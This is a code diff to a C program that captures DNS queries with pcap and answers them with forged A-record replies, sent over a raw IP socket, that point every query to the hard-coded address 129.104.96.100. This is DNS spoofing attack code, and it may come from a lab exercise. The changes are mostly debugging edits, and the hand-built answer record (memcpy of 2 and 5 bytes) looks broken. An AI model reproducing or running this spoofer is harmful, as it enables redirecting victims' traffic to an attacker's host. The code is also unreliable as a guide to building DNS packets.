@@ -210,31 +210,31 @@ void process_packet(u_char *args, const struct pcap_pkthdr *header, const u_char
 
 	//	parse the dns query
 	int id = parse_dns_query(dns_buff, queries, answers, auth, addit);
-	if((ntohs(((dns_header* )dns_buff)->qd_count)!=1)) return;
+	if((ntohs(((dns_header* )dns_buff)->qd_count)!=1)||(((dns_header* )dns_buff)->ar_count)!=0) return;
 	printf("passed dns check\n");
 	/******************now build the reply using raw IP ************/
 	uint8_t send_buf[BUF_SIZE]; //sending buffer
 	bzero(send_buf, BUF_SIZE);
 
 	/**********dns header*************/
-	printf("here\n");
 
 	dns_header *dnshdr = (dns_header*)(send_buf + sizeof(struct iphdr) + sizeof(struct udphdr));
 	int dns_size=sizeof(dns_header)+name_size(queries[0].qname)+14;
     build_dns_header(dnshdr,id,1,0,1,0,0);
-	printf("here\n");
-	res_record* rrf =(res_record*)(dnshdr+1);
-		printf("here\n");
+	u_int8_t* p =dnshdr+1;
 
-	r_element* answer=rrf->element;
-	printf("here2");
-	answer->type=htons(TYPE_A);
-    answer->rdlength=htons(4);
-    answer->ttl=htonl(1000);
-    answer->_class=htons(CLASS_IN);
-	rrf->name=queries[0].qname;
-	printf("here3");
-	inet_pton(AF_INET,"129.104.96.100",rrf->rdata);
+	r_element answer;
+	answer.type=htons(TYPE_A);
+    answer.rdlength=htons(4);
+    answer.ttl=htonl(1000);
+    answer._class=htons(CLASS_IN);
+	printf("here2\n");
+	memcpy(p,&(queries[0].qname),2);
+	p=p+2;
+	printf("here3\n");
+	memcpy(p,&(answer),5);
+	p=p+5;
+	inet_pton(AF_INET,"129.104.96.100",p);
 
 	printf("past dns\n");
 
@@ -261,7 +261,6 @@ void process_packet(u_char *args, const struct pcap_pkthdr *header, const u_char
     iph->daddr=in_iphr->saddr;
 	iph->check=htons(checksum((char*) iph,iph->tot_len));
 	
-
 	/************** send out using raw IP socket************/
 	printf("to the end\n");
 
@@ -277,8 +276,9 @@ void process_packet(u_char *args, const struct pcap_pkthdr *header, const u_char
 	}
 	struct sockaddr_in to;
 	to.sin_addr.s_addr=in_iphr->saddr;
-	to.sin_family=htons(AF_INET);
+	to.sin_family=AF_INET;
 	to.sin_port=in_udphdr->source;
+	print_udp_packet(send_buf,size);
 	sendto(fd,send_buf,ntohs(iph->tot_len),0,&to,sizeof(to));
 	perror("");
 
